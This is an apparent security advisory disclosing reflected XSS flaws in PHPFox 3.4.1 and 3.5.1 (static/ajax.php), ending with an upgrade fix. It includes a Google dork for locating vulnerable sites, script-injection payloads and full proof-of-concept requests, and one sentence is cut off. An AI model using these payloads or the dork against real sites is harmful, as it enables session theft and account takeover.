- Affected versions: version 3.4.1  and 3.5.1 is vulnerable. Other
versions might be affected as well.
- Vulnerability discovered by: Mehdi Dadkhah (Isfahan z10o0@yahoo.com)
-Google Dork: "Powered By PHPFox Version 3.4.1"
== Vulnerabilities ==
URL encoded POST input sId was set to &#039;"()&%1<ScRiPt >prompt(945307)</ScRiPt>
This vulnerability affects in [UrlOfSite]/static/ajax.php
OR
URL encoded POST input block_id was set to &#039;"()&%1<ScRiPt >prompt(983655)</ScRiPt>
This vulnerability affects in [UrlOfSite]/static/ajax.php
OR
URL encoded GET input message was set to &#039;"()&%1<ScRiPt >prompt(990170)</ScRiPt>
This vulnerability affects in [UrlOfSite]/static/ajax.php
Above parameters are not correctly
sanitized before being used , making them
vulnerable to XSS attacks.
 
== Proof of concept ==
 
- For the sId parameter, when URL encoded POST input block_id was set to &#039;"()&%1<ScRiPt >prompt(983655)</ScRiPt>
then we have this:
 
POST /static/ajax.php 
block_id=%27%22%28%29%26%251%3cScRiPt%20%3eprompt%28983655%29%3c%2fScRiPt%3e&core[ajax]
=true&core[call]=core.hideBlock&core[is_admincp]=0&core[is_user_profile]=0&core[profile_user_id]=0&core[security_token]=fb93d433ca43a5a389075476267439f6&sController=video.index&type_id= video_category

- For the message parameter,URL encoded GET input message was set to &#039;"()&%1<ScRiPt >prompt(990170)</ScRiPt>
then we have this:

GET /static/ajax.php?core[ajax]=true&core[call]=core.message&core[security_token]=
fb93d433ca43a5a389075476267439f6&height=150&message=%27%22%28%29%26%251%3cScRiPt%20%3eprompt%28990170%29%3c%2fScRiPt%3e&width=300

Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user 
in order to gather data from them. An attacker can steal the session cookie and take over the account, impersonating 
== Solution ==
Upgrade the product to the 3.6.0 (build6) version. Note that builds 4
and 5 also may contain the vulnerability.
